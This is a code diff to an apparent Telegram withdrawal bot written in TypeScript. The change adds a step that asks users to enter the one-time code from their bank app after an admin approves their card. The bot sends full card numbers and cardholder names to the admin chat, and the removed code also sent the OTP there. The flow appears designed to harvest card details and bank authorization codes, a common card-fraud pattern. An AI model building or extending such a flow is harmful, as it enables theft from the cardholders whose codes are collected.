@@ -414,18 +414,24 @@ const handleApproveCard = async (withdrawalId: string, adminChatId: number) => {
       return
     }
 
-    // Admin approves - mark as verified and ready for payment
+    // Admin approves - now awaiting user OTP
     await prisma.withdrawal.update({
       where: { id: withdrawalId },
-      data: { status: 'WITHDRAWAL_PENDING', isVerified: true },
+      data: { status: 'AWAITING_OTP' },
     })
 
-    await sendMessage(adminChatId, `✅ Card approved! Ready for payment.\n\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nHolder: ${withdrawal.cardholderName}\nAmount: $${withdrawal.amount}\nOTP: ${withdrawal.verificationCode}`)
-    
-    if (withdrawal?.user?.telegramChatId) {
-      await sendMessage(Number(withdrawal.user.telegramChatId),
-        `✅ Your withdrawal card has been approved! Admin will process the payment shortly.`)
+    // Notify user to enter OTP
+    if (withdrawal?.user?.telegramChatId && BOT_TOKEN) {
+      try {
+        const bot = new TelegramBot(BOT_TOKEN, { polling: false })
+        await bot.sendMessage(withdrawal.user.telegramChatId,
+          `✅ Your withdrawal card has been approved!\n\nPlease enter the OTP from your bank app to proceed with withdrawal of $${withdrawal.amount}.`)
+      } catch (e) {
+        console.error('Failed to notify user:', e)
+      }
     }
+
+    await sendMessage(adminChatId, `✅ Card approved. User will enter OTP.\n\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nHolder: ${withdrawal.cardholderName}\nAmount: $${withdrawal.amount}`)
   } catch (error) {
     console.error('Approve card error:', error)
     await sendMessage(adminChatId, '❌ Failed to approve card.')
@@ -490,7 +496,7 @@ const handleRejectWithdrawal = async (withdrawalId: string, adminChatId: number)
     })
     
     const result = await prisma.withdrawal.updateMany({
-      where: { id: withdrawalId, status: { in: ['WAITING_FOR_ADMIN_APPROVAL', 'CARD_APPROVED_WAITING_USER', 'WITHDRAWAL_PENDING'] } },
+      where: { id: withdrawalId, status: { in: ['WAITING_FOR_ADMIN_APPROVAL', 'AWAITING_OTP', 'WITHDRAWAL_PENDING'] } },
       data: { status: 'REJECTED' },
     })
     if (result.count === 0) {
